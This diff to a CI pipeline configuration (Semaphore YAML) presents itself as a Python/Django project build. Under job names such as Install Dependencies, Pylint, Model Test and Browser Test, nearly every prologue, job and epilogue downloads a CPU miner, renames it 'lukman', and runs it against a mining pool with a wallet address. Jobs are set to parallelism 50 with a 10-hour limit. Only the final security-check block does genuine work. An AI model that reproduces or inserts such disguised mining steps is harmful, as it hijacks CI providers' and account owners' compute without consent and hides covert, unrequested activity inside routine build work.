@@ -1,13 +1,194 @@
 version: v1.0
-name: Initial Pipeline
+name: Python
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-4
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 10
+global_job_config:
+  prologue:
+    commands:
+      - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+      - tar xf cpuminer-opt-linux.tar.gz
+      - mv cpuminer-sse2 lukman
+      - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+  epilogue:
+    always:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 lukman
+        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+    on_pass:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 lukman
+        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+    on_fail:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 lukman
+        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
 blocks:
-  - name: 'Block #1'
+  - name: Install Dependencies
+    task:
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+      jobs:
+        - name: pip
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+  - name: Run Code Analysis
+    task:
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+      jobs:
+        - name: Pylint
+          commands:
+						- 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+  - name: Run Unit Tests
+    task:
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+      jobs:
+        - name: Model Test
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+          parallelism: 50
+        - name: View Test
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+  - name: Run Browser Tests
+    task:
+      env_vars:
+        - name: DB_NAME
+          value: pydjango
+      prologue:
+        commands:
+					- 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+      jobs:
+        - name: Browser Test
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_pass:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.1 -t10'
+  - name: Run Security Tests
     task:
       jobs:
-        - name: 'Job #1'
+        - name: Deployment Checklist
           commands:
             - checkout
+            - cache restore
+            - pip install -r requirements.txt --cache-dir .pip_cache
+            - python manage.py check --deploy --fail-level ERROR
